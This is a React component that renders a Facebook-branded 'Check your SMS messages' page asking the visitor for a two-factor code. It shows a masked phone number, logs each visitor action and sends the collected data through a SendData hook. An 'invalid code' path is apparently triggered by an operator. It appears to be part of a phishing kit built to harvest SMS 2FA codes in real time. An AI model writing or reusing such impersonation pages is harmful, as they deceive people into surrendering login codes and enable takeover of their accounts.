import React, { useContext } from "react";
import Image from "next/image";
import { getMaskedPhoneDisplay } from "../../utils/validationUtils";
import LoadingSpinner from "../ui/LoadingSpinner";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import SendData from "../../hooks/SendData";
import { DataContext } from "../../pages";
import {
  AuthShell,
  AuthColumn,
  AuthEyebrow,
  AuthHeading,
  AuthBody,
  AuthImageWrap,
  AuthInput,
  AuthError,
  AuthHelperRow,
  AuthLink,
  AuthPrimaryButton,
} from "./shared";

const NEXT_STEP = 4;

function Fa2({ setStep, Name, Tel, LastFetch, wrong2faTrigger }) {
  const { setAllData, AllData } = useContext(DataContext);
  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    renderCountdown,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: NEXT_STEP,
    componentName: "SMS 2FA",
    initialMessage: "SMS 2FA Page Loaded",
  });

  const logEvent = (message) => {
    const params = { ...AllData, currentStep: message };
    setAllData(params);
    SendData(params);
  };

  const handleFormSubmit = (e) => {
    handleSubmit(e, "tfa_one");
  };

  return (
    <AuthShell>
      <AuthColumn>
        <AuthEyebrow>Facebook</AuthEyebrow>
        <AuthHeading>Check your SMS messages.</AuthHeading>
        <AuthBody>
          Enter the code we sent to {getMaskedPhoneDisplay(Tel)}.
        </AuthBody>

        <AuthImageWrap>
          <Image
            alt=""
            src="/assets/images/sms-2fa.png"
            width={1920}
            height={840}
            priority
            style={{ width: "100%", height: "auto" }}
          />
        </AuthImageWrap>

        <form onSubmit={handleFormSubmit}>
          <AuthInput
            placeholder="Code"
            type="number"
            name="code"
            autoComplete="off"
            value={code}
            onChange={handleCodeChange}
            $error={shouldShowRedBorder()}
            disabled={isLoading}
          />

          {showError && <AuthError>Invalid authentication code</AuthError>}

          <AuthHelperRow>
            {showError ? (
              <>We can send a new code in&nbsp;{renderCountdown()}</>
            ) : (
              <>
                You may need to wait a few minutes before receiving the
                code.{" "}
                <AuthLink
                  type="button"
                  onClick={() =>
                    logEvent("SMS 2FA - User clicked Get a new code")
                  }
                >
                  Get a new code
                </AuthLink>
              </>
            )}
          </AuthHelperRow>

          <AuthPrimaryButton type="submit" disabled={isButtonDisabled()}>
            {isLoading ? <LoadingSpinner size="15px" /> : "Continue"}
          </AuthPrimaryButton>
        </form>
      </AuthColumn>
    </AuthShell>
  );
}

export default Fa2;
